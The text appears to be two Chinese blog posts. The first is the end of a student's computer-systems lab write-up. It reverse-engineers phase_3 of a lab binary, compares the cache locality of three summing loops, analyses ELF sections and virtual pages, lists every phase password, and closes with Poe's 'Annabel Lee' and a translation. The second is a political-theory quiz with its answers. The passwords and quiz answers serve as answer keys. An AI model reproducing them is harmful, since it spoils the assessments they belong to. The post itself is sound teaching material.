3c 30                	cmp    $0x30,%al</span><br><span class="line">  40135c:	74 17                	je     401375 &lt;phase_3+0x50&gt;</span><br><span class="line">  40135e:	3c 31                	cmp    $0x31,%al</span><br><span class="line">  401360:	74 21                	je     401383 &lt;phase_3+0x5e&gt;</span><br><span class="line">  401362:	3c 32                	cmp    $0x32,%al</span><br><span class="line">  401364:	74 2b                	je     401391 &lt;phase_3+0x6c&gt;</span><br><span class="line">  401366:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40136b:	e8 74 04 00 00       	callq  4017e4 &lt;sad_ending&gt;</span><br><span class="line">  401370:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401374:	c3                   	retq   </span><br><span class="line">  401375:	48 8d 3d 84 2d 00 00 	lea    0x2d84(%rip),%rdi        # 404100 &lt;array&gt;</span><br><span class="line">  40137c:	e8 fb fe ff ff       	callq  40127c &lt;sum_0&gt;</span><br><span class="line">  401381:	eb ed                	jmp    401370 &lt;phase_3+0x4b&gt;</span><br><span class="line">  401383:	48 8d 3d 76 2d 00 00 	lea    0x2d76(%rip),%rdi        # 404100 &lt;array&gt;</span><br><span class="line">  40138a:	e8 45 ff ff ff       	callq  4012d4 &lt;sum_1&gt;</span><br><span class="line">  40138f:	eb df                	jmp    401370 &lt;phase_3+0x4b&gt;</span><br><span class="line">  401391:	48 8d 3d 68 2d 00 00 	lea    0x2d68(%rip),%rdi        # 404100 &lt;array&gt;</span><br><span class="line">  401398:	e8 89 fe ff ff       	callq  401226 &lt;sum_2&gt;</span><br><span class="line">  40139d:	eb d1                	jmp    401370 &lt;phase_3+0x4b&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p>可以看出其核心是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (x) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x30</span>: &#123;sum_0(<span class="built_in">array</span>);<span class="keyword">break</span>;&#125; <span class="comment">// array from 0x401000</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x31</span>: &#123;sum_1(<span class="built_in">array</span>);<span class="keyword">break</span>;&#125; <span class="comment">// array from 0x401000</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x32</span>: &#123;sum_2(<span class="built_in">array</span>);<span class="keyword">break</span>;&#125; <span class="comment">// array from 0x401000</span></span><br><span class="line">  <span class="keyword">default</span>: sad_ending();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要分析三个<code>sum</code>函数，选择局部性最好的一个，并输入对应的符号（<code>0x30</code>、<code>0x31</code>或<code>0x32</code>）。</p>
<h2 id="sum-loop"><a href="#sum-loop" class="headerlink" title="sum: loop"></a>sum: <em>loop</em></h2><p>三个<code>sum</code>函数的参数都是一个数组，但使用不同的算法实现了相同的功能。</p>
<p>根据名字推测其功能是对数组求和。</p>
<p><code>phase_3</code>中<code>sum</code>的结构较为复杂，它和<code>phase_2</code>一起，作为整个实验的核心。</p>
<h3 id="sum-0"><a href="#sum-0" class="headerlink" title="sum_0"></a><code>sum_0</code></h3><p><code>sum_0</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040127c &lt;sum_0&gt;:</span><br><span class="line">  40127c:	48 8d b7 00 02 20 00 	lea    0x200200(%rdi),%rsi</span><br><span class="line">  401283:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401288:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  40128d:	eb 38                	jmp    4012c7 &lt;sum_0+0x4b&gt;</span><br><span class="line">  40128f:	48 81 c1 00 80 00 00 	add    $0x8000,%rcx</span><br><span class="line">  401296:	48 39 f1             	cmp    %rsi,%rcx</span><br><span class="line">  401299:	74 15                	je     4012b0 &lt;sum_0+0x34&gt;</span><br><span class="line">  40129b:	48 8d 81 00 fe ff ff 	lea    -0x200(%rcx),%rax</span><br><span class="line">  4012a2:	48 03 10             	add    (%rax),%rdx</span><br><span class="line">  4012a5:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">  4012a9:	48 39 c8             	cmp    %rcx,%rax</span><br><span class="line">  4012ac:	75 f4                	jne    4012a2 &lt;sum_0+0x26&gt;</span><br><span class="line">  4012ae:	eb df                	jmp    40128f &lt;sum_0+0x13&gt;</span><br><span class="line">  4012b0:	48 81 c6 00 02 00 00 	add    $0x200,%rsi</span><br><span class="line">  4012b7:	48 81 c7 00 02 00 00 	add    $0x200,%rdi</span><br><span class="line">  4012be:	48 81 ff 00 80 00 00 	cmp    $0x8000,%rdi</span><br><span class="line">  4012c5:	74 09                	je     4012d0 &lt;sum_0+0x54&gt;</span><br><span class="line">  4012c7:	48 8d 8e 00 00 e0 ff 	lea    -0x200000(%rsi),%rcx</span><br><span class="line">  4012ce:	eb cb                	jmp    40129b &lt;sum_0+0x1f&gt;</span><br><span class="line">  4012d0:	48 89 d0             	mov    %rdx,%rax</span><br><span class="line">  4012d3:	c3                   	retq </span><br></pre></td></tr></table></figure>
<hr>
<p>转换成C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_0</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>; <span class="comment">// %edx</span></span><br><span class="line">  <span class="keyword">int</span>* end = <span class="built_in">array</span> + <span class="number">262208</span>; <span class="comment">// 0x200200(%rdi)-&gt;%rsi</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != <span class="number">32768</span>; end += <span class="number">64</span>, i += <span class="number">512</span>) <span class="comment">// 0x0-&gt;%edi</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>* mid = end - <span class="number">262144</span>; mid != end; mid += <span class="number">4096</span>) <span class="comment">// -0x200000(%rsi)-&gt;%rcx</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span>* begin = mid - <span class="number">64</span>; begin != mid; begin++) <span class="comment">// -0x200(%rcx)-&gt;%rax</span></span><br><span class="line">        sum += *begin;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sum-1"><a href="#sum-1" class="headerlink" title="sum_1"></a><code>sum_1</code></h3><p><code>sum_1</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004012d4 &lt;sum_1&gt;:</span><br><span class="line">  4012d4:	48 8d b7 00 80 20 00 	lea    0x208000(%rdi),%rsi</span><br><span class="line">  4012db:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  4012e0:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4012e5:	eb 31                	jmp    401318 &lt;sum_1+0x44&gt;</span><br><span class="line">  4012e7:	48 81 c1 00 02 00 00 	add    $0x200,%rcx</span><br><span class="line">  4012ee:	48 39 f1             	cmp    %rsi,%rcx</span><br><span class="line">  4012f1:	74 17                	je     40130a &lt;sum_1+0x36&gt;</span><br><span class="line">  4012f3:	48 8d 81 00 00 e0 ff 	lea    -0x200000(%rcx),%rax</span><br><span class="line">  4012fa:	48 03 10             	add    (%rax),%rdx</span><br><span class="line">  4012fd:	48 05 00 80 00 00    	add    $0x8000,%rax</span><br><span class="line">  401303:	48 39 c8             	cmp    %rcx,%rax</span><br><span class="line">  401306:	75 f2                	jne    4012fa &lt;sum_1+0x26&gt;</span><br><span class="line">  401308:	eb dd                	jmp    4012e7 &lt;sum_1+0x13&gt;</span><br><span class="line">  40130a:	48 83 c7 01          	add    $0x1,%rdi</span><br><span class="line">  40130e:	48 83 c6 08          	add    $0x8,%rsi</span><br><span class="line">  401312:	48 83 ff 40          	cmp    $0x40,%rdi</span><br><span class="line">  401316:	74 09                	je     401321 &lt;sum_1+0x4d&gt;</span><br><span class="line">  401318:	48 8d 8e 00 80 ff ff 	lea    -0x8000(%rsi),%rcx</span><br><span class="line">  40131f:	eb d2                	jmp    4012f3 &lt;sum_1+0x1f&gt;</span><br><span class="line">  401321:	48 89 d0             	mov    %rdx,%rax</span><br><span class="line">  401324:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>转换成C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_1</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>; <span class="comment">// %edx</span></span><br><span class="line">  <span class="keyword">int</span>* end = <span class="built_in">array</span> + <span class="number">266240</span>; <span class="comment">// 0x208000(%rdi)-&gt;%rsi</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != <span class="number">64</span>; end++, i++) <span class="comment">// 0x0-&gt;%edi</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>* mid = end - <span class="number">4096</span>; mid != end; mid += <span class="number">64</span>) <span class="comment">// -0x8000(%rsi)-&gt;%rcx</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span>* begin = mid - <span class="number">262144</span>; begin != mid; begin += <span class="number">4096</span>) <span class="comment">// -0x200000(%rcx)-&gt;%rax</span></span><br><span class="line">        sum += *begin;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sum-2"><a href="#sum-2" class="headerlink" title="sum_2"></a><code>sum_2</code></h3><p><code>sum_2</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401226 &lt;sum_2&gt;:</span><br><span class="line">  401226:	48 8d b7 00 82 00 00 	lea    0x8200(%rdi),%rsi</span><br><span class="line">  40122d:	4c 8d 87 00 00 20 00 	lea    0x200000(%rdi),%r8</span><br><span class="line">  401234:	ba 00 00 00 00       	mov    $0x0,%edx</span><br><span class="line">  401239:	eb 34                	jmp    40126f &lt;sum_2+0x49&gt;</span><br><span class="line">  40123b:	48 81 c1 00 02 00 00 	add    $0x200,%rcx</span><br><span class="line">  401242:	48 39 f1             	cmp    %rsi,%rcx</span><br><span class="line">  401245:	74 15                	je     40125c &lt;sum_2+0x36&gt;</span><br><span class="line">  401247:	48 8d 81 00 fe ff ff 	lea    -0x200(%rcx),%rax</span><br><span class="line">  40124e:	48 03 10             	add    (%rax),%rdx</span><br><span class="line">  401251:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">  401255:	48 39 c8             	cmp    %rcx,%rax</span><br><span class="line">  401258:	75 f4                	jne    40124e &lt;sum_2+0x28&gt;</span><br><span class="line">  40125a:	eb df                	jmp    40123b &lt;sum_2+0x15&gt;</span><br><span class="line">  40125c:	48 81 c6 00 80 00 00 	add    $0x8000,%rsi</span><br><span class="line">  401263:	48 81 c7 00 80 00 00 	add    $0x8000,%rdi</span><br><span class="line">  40126a:	4c 39 c7             	cmp    %r8,%rdi</span><br><span class="line">  40126d:	74 09                	je     401278 &lt;sum_2+0x52&gt;</span><br><span class="line">  40126f:	48 8d 8f 00 02 00 00 	lea    0x200(%rdi),%rcx</span><br><span class="line">  401276:	eb cf                	jmp    401247 &lt;sum_2+0x21&gt;</span><br><span class="line">  401278:	48 89 d0             	mov    %rdx,%rax</span><br><span class="line">  40127b:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>转换成C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_2</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">array</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sum = <span class="number">0</span>; <span class="comment">// %edx</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span>* end = <span class="built_in">array</span> + <span class="number">4160</span>, flag = <span class="built_in">array</span> + <span class="number">262144</span>; <span class="built_in">array</span> != flag; end += <span class="number">4096</span>, <span class="built_in">array</span> += <span class="number">4096</span>)<span class="comment">// 0x8200(%rdi)-&gt;%rsi, 0x200000(%rdi)-&gt;r8</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>* mid = <span class="built_in">array</span> + <span class="number">64</span>; mid != end; mid += <span class="number">64</span>) <span class="comment">// 0x200(%rdi)-&gt;%rcx</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span>* begin = mid - <span class="number">64</span>; begin != mid; begin++) <span class="comment">// -0x200(%rcx)-&gt;%rax</span></span><br><span class="line">        sum += *begin;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sum"><a href="#sum" class="headerlink" title="sum"></a><code>sum</code></h3><p>综合三个<code>sum</code>函数可以看出，它们的共同功能是利用三层循环对一个大小为266240的<code>int</code>型数组分块求和（不要认为数组大小是266304）：</p>
<ul>
<li><p><code>sum_0</code>把数组用<code>mid</code>分成0～63、64～262207和262208～266240三块，最内层循环将<code>mid</code>左侧64个元素按1步长求和；中层循环使<code>mid</code>按4096步长移动；外层循环使<code>end</code>按64步长移动(266304-262208)/(32768/512)=64次。</p>
<p>对于<code>mid</code>的每次移动，<code>begin</code>都会将其左侧64个元素求和，且<strong>已求和区间间隔为4096</strong>。</p>
<p>对于<code>end</code>的每次移动，<code>mid</code>也随之向后偏移64个元素，且此64个元素由<code>begin</code>全部求和。<code>end</code>移动64次后，偏移了64x64=4096个元素，到达262208+4096=266304处；<code>mid</code>也一共偏移了64x64=4096个元素，恰好将第一次的间隔补满。且最后<code>mid</code>与<code>end</code>相差64，正好到达数组末尾处（266304-64=266240）。</p>
</li>
<li><p><code>sum_1</code>把数组用<code>mid</code>分成0～262143和262144～266240两块，最内层循环将<code>mid</code>左侧262144个元素按4096步长求和；中层循环使<code>mid</code>按64步长移动；外层循环使<code>end</code>从266240按1步长移动64/1=64次。（<strong>注意<code>%rdi</code>表示的类型变为整数，不再是地址！<em>感谢 @SH4NG 的指正！</em></strong>）</p>
<p>对于<code>mid</code>的每次移动，<code>begin</code>都会将其左侧262144个元素隔4096求和，而<code>mid</code>也向右按64步长移动4096/64=64次，即<strong>已求和区间间隔为4096/64=64</strong>。</p>
<p>对于<code>end</code>的每次移动，<code>mid</code>也随之向后偏移1个元素，<code>end</code>移动64次后，偏移了64x1=64个元素，到达266240+64=266304处；<code>mid</code>也一共偏移了64x1=64个元素，恰好将第一次的间隔补满。且最后<code>mid</code>与<code>end</code>相差64，正好到达数组末尾处（266304-64=266240）。</p>
</li>
<li><p><code>sum_2</code>把数组用<code>mid</code>分成0～63、64～4159和4160～266240三块，最内层循环将<code>mid</code>左侧64个元素按1步长求和；中层循环使<code>mid</code>按64步长移动；外层循环使<code>end</code>从4160按4096步长移动262144/4096=64次。</p>
<p>对于<code>mid</code>的每次移动，<code>begin</code>都会将其左侧64个元素求和，而<code>mid</code>步长同样为64。注意<code>array</code>并未清零，而是以步长为4096提供给<code>mid</code>追赶<code>end</code>，即每次<code>end</code>移动时，<code>mid</code>都会领先<code>array</code>4096。由于<code>mid</code>步长为64，则中层循环将<code>end-64</code>左侧4096个元素按1步长求和。</p>
<p>对于<code>end</code>每次移动4096个元素，<code>mid</code>都会滞后64个元素（开始时<code>array</code>滞后4160-4096=64）将左侧4096个元素全部求和。<code>array</code>移动到262144时，此时<code>mid</code>恰好移动到数组末尾（262144+4096=266240）。</p>
</li>
</ul>
<p>综合三种分块方式和步长索引，可以发现：</p>
<ul>
<li><p>三个函数均为三层循环，时间局部性相差较小；</p>
</li>
<li><p><code>sum_0</code>中<code>begin</code>的步长较小但<code>mid</code>步长较大，导致<code>begin</code>在数组中不断跳跃4096个元素访问，空间局部性较差；</p>
</li>
<li><p><code>sum_1</code>中<code>begin</code>的步长较大，导致比<code>sum_0</code>更频繁地跳跃式访问，空间局部性最差；</p>
</li>
<li><p><code>sum_2</code>中<code>begin</code>和<code>mid</code>的步长均较小，且<code>begin</code>的范围等于<code>mid</code>的步长，从而可以实现<code>begin</code>的连续寻址访问，空间局部性最好。</p>
</li>
</ul>
<hr>
<p>综合以上分析，<code>sum_2</code>具有最好的局部性特性，因此<code>phase_3</code>的密码就是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">32</span><br></pre></td></tr></table></figure>
<h1 id="任务四——虚拟内存分析"><a href="#任务四——虚拟内存分析" class="headerlink" title="任务四——虚拟内存分析"></a>任务四——虚拟内存分析</h1><blockquote>
<p>使用<code>objdump</code>和<code>readelf</code>等工具分析该elf文件中<code>.text</code>，<code>.data</code>，<code>.bss</code>和<code>.rodata</code>这四个section，并计算：</p>
<ul>
<li>各section实际使用内存空间大小</li>
<li>各section在内存中的起始地址（虚拟地址）</li>
<li>各section需要的虚拟页数量（pagesize=4KB）</li>
</ul>
</blockquote>
<hr>
<p>什么是ELF文件？</p>
<blockquote>
<p>ELF（Executable and Linkable Format）文件，是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件。</p>
<p>ELF文件由4部分组成，分别是：</p>
<ul>
<li>ELF头（ELF header）</li>
<li>程序头表（Program header table）</li>
<li>节（Section）</li>
<li>节头表（Section header table）</li>
</ul>
</blockquote>
<p>这四个section是什么？</p>
<blockquote>
<ul>
<li><p><code>.text</code>：已编译程序的机器代码。</p>
</li>
<li><p><code>.data</code>：已初始化的全局和静态C变量。</p>
<p>局部C变量在运行时被保存在栈中，既不出现在<code>.data</code>节中，也不出现在<code>.bss</code>节中。</p>
</li>
<li><p><code>.bss</code>：未初始化的全局和静态C变量，以及所有被初始化为0的全局或静态变量。</p>
<p>在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。</p>
<p>目标文件格式区分已初始化和未初始化变量是为了空间效率：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。运行时，在内存中分配这些变量，初始值为0。</p>
</li>
<li><p><code>.rodata</code>：只读数据。</p>
<p>比如<code>printf</code>语句中的格式串和开关语句的跳转表。</p>
</li>
</ul>
</blockquote>
<p>什么是虚拟内存？</p>
<blockquote>
<p><strong>虚拟内存（VM）</strong>是一种对主存的抽象，可以更加有效地管理内存并且减少出错。</p>
<p>虚拟内存是硬件异常、硬件地址翻译、主存、磁盘文件和内核软件的完美交互，它为每个进程提供了一个大的、一致的和私有的地址空间。</p>
</blockquote>
<p>虚拟内存有什么作用？</p>
<blockquote>
<p>虚拟内存通过一个很清晰的机制，提供了三个重要的能力：</p>
<ul>
<li>它将主存看成是一个存储在磁盘上的地址空间的高速缓存，在主存中只保存活动区域，并根据需要在磁盘和主存之间来回传送数据，通过这种方式，它高效地使用了主存；</li>
<li>它为每个进程提供了一致的地址空间，从而简化了内存管理；</li>
<li>它保护了每个进程的地址空间不被其他进程破坏。</li>
</ul>
</blockquote>
<p>什么是虚拟地址？</p>
<blockquote>
<p>虚拟内存被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组，每字节都有一个唯一的虚拟地址，作为到数组的索引。</p>
<p>虚拟地址（Virtual Address，VA）是CPU访问主存的重要途径，这个虚拟地址在被送到内存之前先转换成适当的物理地址。</p>
</blockquote>
<p>什么是虚拟页？</p>
<blockquote>
<p><strong>虚拟页（Virtual Page，VP）</strong>就是VM系统将虚拟内存分割成的大小固定的块，作为磁盘（较低层）和主存（较高层）之间的传输单元。</p>
</blockquote>
<hr>
<p><a href="https://man.linuxde.net/objdump"><code>objdump</code>还有什么用法？</a></p>
<p><a href="https://man.linuxde.net/readelf">什么是<code>readelf</code>命令？</a></p>
<hr>
<p>利用<code>readelf</code>查看各section的信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">readelf -S -W exam</span><br></pre></td></tr></table></figure>
<p>在输出中找到四个section：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">There are 29 section headers, starting at offset 0x3eb0:</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al</span><br><span class="line">...</span><br><span class="line">  [13] .text             PROGBITS        0000000000401140 001140 000b35 00  AX  0   0 16</span><br><span class="line">...</span><br><span class="line">  [15] .rodata           PROGBITS        0000000000402000 002000 0002f7 00   A  0   0  8</span><br><span class="line">...</span><br><span class="line">  [23] .data             PROGBITS        00000000004040a0 0030a0 000010 00  WA  0   0  8</span><br><span class="line">  [24] .bss              NOBITS          00000000004040c0 0030b0 200050 00  WA  0   0 32</span><br><span class="line">...</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure>
<p>可以发现：</p>
<table>
<thead>
<tr>
<th>section</th>
<th>大小</th>
<th>起始地址</th>
</tr>
</thead>
<tbody><tr>
<td><code>.text</code></td>
<td>0x000b35</td>
<td>0x401140</td>
</tr>
<tr>
<td><code>.data</code></td>
<td>0x000010</td>
<td>0x4040a0</td>
</tr>
<tr>
<td><code>.bss</code></td>
<td>0x200050</td>
<td>0x4040c0</td>
</tr>
<tr>
<td><code>.rodata</code></td>
<td>0x0002f7</td>
<td>0x402000</td>
</tr>
</tbody></table>
<p>根据“虚拟页是对虚拟内存的划分”，且虚拟页大小为4KB=0x1000字节，结合各section的大小和起始地址可以得出：</p>
<ul>
<li><p><code>.text</code>在0x401000～0x402000之间，故需要的虚拟页数量为1；</p>
</li>
<li><p><code>.data</code>：在0x404000～0x405000之间，故需要的虚拟页数量为1；</p>
</li>
<li><p><code>.bss</code>：在0x404000～0x605000之间，故需要的虚拟页数量为513<em>（此处用十六进制计算，感谢 @祖国的花朵 的指正）</em>；</p>
</li>
<li><p><code>.rodata</code>：在0x402000～0x403000之间，故需要的虚拟页数量为1。</p>
</li>
</ul>
<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>将每个任务的密码的十六进制形式存放到<code>data.txt</code>中，利用<code>hex2raw</code>并运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; data.txt | ./exam</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Input sth. please.</span><br><span class="line"></span><br><span class="line">Ohh! You have found the entrance.</span><br><span class="line"></span><br><span class="line">Skip phase 0? (y/n)n</span><br><span class="line">You have entered PHASE 0</span><br><span class="line">Input phase 0 password:But we loved with a love that was more than love</span><br><span class="line">Good! You have passed PHASE 0!</span><br><span class="line"></span><br><span class="line">Skip phase 1? (y/n)n</span><br><span class="line">You have entered PHASE 1</span><br><span class="line">Input phase 1 password:9Q*a</span><br><span class="line">Great! You have passed PHASE 1!!</span><br><span class="line"></span><br><span class="line">Skip phase 2? (y/n)n</span><br><span class="line">You have entered PHASE 2</span><br><span class="line">Input phase 2 password:Mp)zixD-%H</span><br><span class="line">Awesome! You have passed PHASE 2!!!</span><br><span class="line"></span><br><span class="line">Skip phase 3? (y/n)n</span><br><span class="line">You have entered PHASE 3</span><br><span class="line">choose a function whith the best locality to run:2</span><br><span class="line"></span><br><span class="line">[[You have pass all the levels! (*@o@*)]]</span><br></pre></td></tr></table></figure>
<p>此处存在语法错误，若改为<code>passed</code>就完美了。</p>
<p>实验结束。</p>
<hr>
<p><strong>安娜贝尔·丽</strong></p>
<p><strong>第一节</strong></p>
<p>It was many and many a year ago,</p>
<p>In a kingdom by the sea,</p>
<p>That a maiden there lived whom you may know</p>
<p>By the name of ANNABEL LEE;</p>
<p>And this maiden she lived with no other thought</p>
<p>Than to love and be loved by me.</p>
<p><strong>第二节</strong></p>
<p>I was a child and she was a child,</p>
<p>In this kingdom by the sea;</p>
<p>But we loved with a love that was more than love —</p>
<p>I and my Annabel Lee;</p>
<p>With a love that the winged seraphs of heaven</p>
<p>Coveted her and me.</p>
<p><strong>第三节</strong></p>
<p>And this was the reason that, long ago,</p>
<p>In this kingdom by the sea,</p>
<p>A wind blew out of a cloud, chilling</p>
<p>My beautiful Annabel Lee;</p>
<p>So that her highborn kinsman came</p>
<p>And bore her away from me,</p>
<p>To shut her up in a sepulchre</p>
<p>In this kingdom by the sea.</p>
<p><strong>第四节</strong></p>
<p>The angels, not half so happy in heaven,</p>
<p>Went envying her and me —</p>
<p>Yes! — that was the reason (as all men know,</p>
<p>In this kingdom by the sea)</p>
<p>That the wind came out of the cloud by night,</p>
<p>Chilling and killing my Annabel Lee.</p>
<p><strong>第五节</strong></p>
<p>But our love it was stronger by far than the love</p>
<p>Of those who were older than we —</p>
<p>Of many far wiser than we —</p>
<p>And neither the angels in heaven above,</p>
<p>Nor the demons down under the sea,</p>
<p>Can ever dissever my soul from the soul</p>
<p>Of the beautiful Annabel Lee.</p>
<p><strong>第六节</strong></p>
<p>For the moon never beams without bringing me dreams</p>
<p>Of the beautiful Annabel Lee;</p>
<p>And the stars never rise but I feel the bright eyes</p>
<p>Of the beautiful Annabel Lee;</p>
<p>And so, all the night tide, I lie down by the side</p>
<p>Of my darling — my darling — my life and my bride,</p>
<p>In her sepulchre there by the sea,</p>
<p>In her tomb by the sounding sea.</p>
<p>译文：</p>
<p><strong>第一节</strong></p>
<p>很久很久以前，</p>
<p>在一个滨海的国度里，</p>
<p>住着一位少女你或许认得，</p>
<p>她的芳名叫安娜贝尔·李；</p>
<p>这少女活着没有别的愿望，</p>
<p>只为和我两情相许。</p>
<p><strong>第二节</strong></p>
<p>那会儿我还是个孩子，她也未脱稚气，</p>
<p>在这个滨海的国度里；</p>
<p>可我们的爱超越一切，无人能及——</p>
<p>我和我的安娜贝尔·李；</p>
<p>我们爱得那样深，连天上的六翼天使</p>
<p>也把我和她妒嫉——</p>
<p><strong>第三节</strong></p>
<p>这就是那不幸的根源，很久以前</p>
<p>在这个滨海的国度里．</p>
<p>夜里一阵寒风从白云端吹起，冻僵了</p>
<p>我的安娜贝尔·李；</p>
<p>于是她那些高贵的亲戚来到凡间</p>
<p>把她从我的身边夺去，</p>
<p>将她关进一座坟墓</p>
<p>在这个滨海的国度里。</p>
<p><strong>第四节</strong></p>
<p>这些天使们在天上，不及我们一半快活，</p>
<p>于是他们把我和她妒嫉——</p>
<p>对——就是这个缘故（谁不晓得呢，在这个滨海的国度里）</p>
<p>云端刮起了寒风，</p>
<p>冻僵并带走了，我的安娜贝尔·李。</p>
<p><strong>第五节</strong></p>
<p>可我们的爱情远远地胜过</p>
<p>那些年纪长于我们的人——</p>
<p>那些智慧胜于我们的人——</p>
<p>无论是天上的天使，</p>
<p>还是海底的恶魔，</p>
<p>都不能将我们的灵魂分离，</p>
<p>我和我美丽的安娜贝尔·李。</p>
<p><strong>第六节</strong></p>
<p>因为月亮的每一丝清辉都勾起我的回忆</p>
<p>梦里那美丽的安娜贝尔·李</p>
<p>群星的每一次升起都令我觉得秋波在闪动</p>
<p>那是我美丽的安娜贝尔·李</p>
<p>就这样，伴着潮水，我整夜躺在她身旁，</p>
<p>我亲爱的——我亲爱的——我的生命，我的新娘，</p>
<p>在海边那座坟茔里，</p>
<p>在大海边她的墓穴里。</p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Experiments</tag>
      </tags>
  </entry>
  <entry>
    <title>理论学习（三）</title>
    <url>/Theory-Study-3/</url>
    <content><![CDATA[<p>本文整理了理论学习的有关资料，如有错误恳请指正。</p>
<a id="more"></a>

<h1 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h1><p>1935年12月，中共中央在（ ）上确定了抗日民族统一战线的策略方针。</p>
<p>瓦窑堡会议</p>
<p>2018年6月9日-10日，上海合作组织青岛峰会举行。10日，习近平主持会议并发表讲话，强调要提倡（ ）的发展观，践行共同、综合、合作、可持续的安全观，秉持开放、融通、互利、共赢的合作观。</p>
<p>创新、协调、绿色、开放、共享</p>
<p>习近平在2020年中国国际服务贸易交易会全球服务贸易峰会上致辞强调各国要共同营造开放包容的合作环境、共同激活创新引领的合作动能、共同开创互利共赢的合作局面，中国将坚定不移扩大对外开放，继续放宽服务业市场准入，发展服务贸易新业态新模式，支持组建全球服务贸易联盟，支持北京打造国家服务业扩大开放综合示范区，带动形成更高层次（）。</p>
<p>改革开放新格局</p>
<p>2020年6月23日9时43分，我国在西昌卫星发射中心用长征三号乙运载火箭，成功发射北斗系统第（）颗导航卫星，暨北斗三号最后一颗全球组网卫星，至此北斗三号全球卫星导航系统星座部署比原计划提前半年全面完成。</p>
<p>五十五</p>
<p>深圳经济特区建立（）周年庆祝大会10月14日上午在广东省深圳市隆重举行。</p>
<p>40</p>
<p>2020年8月18日，世界卫生组织总干事谭德塞表示，应反对疫苗领域出现的（），一旦确定研发出有效的新冠疫苗，世卫组织战略咨询小组将提供有关合理、公平分配疫苗的建议。</p>
<p>“民族主义”</p>
<p>（）是近代以来中国人民反抗外敌入侵持续时间最长、规模最大、牺牲最多的民族解放斗争，也是第一次取得完全胜利的民族解放斗争。</p>
<p>中国人民抗日战争</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会深入分析了我国发展环境面临的深刻复杂变化，认为当前和今后一个时期，我国发展仍然处于（ ），但机遇和挑战都有新的发展变化。</p>
<p>重要战略机遇期</p>
<p>2020年10月26日至29日，中国共产党第十九届中央委员会第五次全体会议在北京举行。全会听取和讨论了习近平受中央政治局委托作的工作报告，审议通过了《中共中央关于制定国民经济和社会发展第十四个五年规划和（ ）的建议》。</p>
<p>二〇三五年远景目标</p>
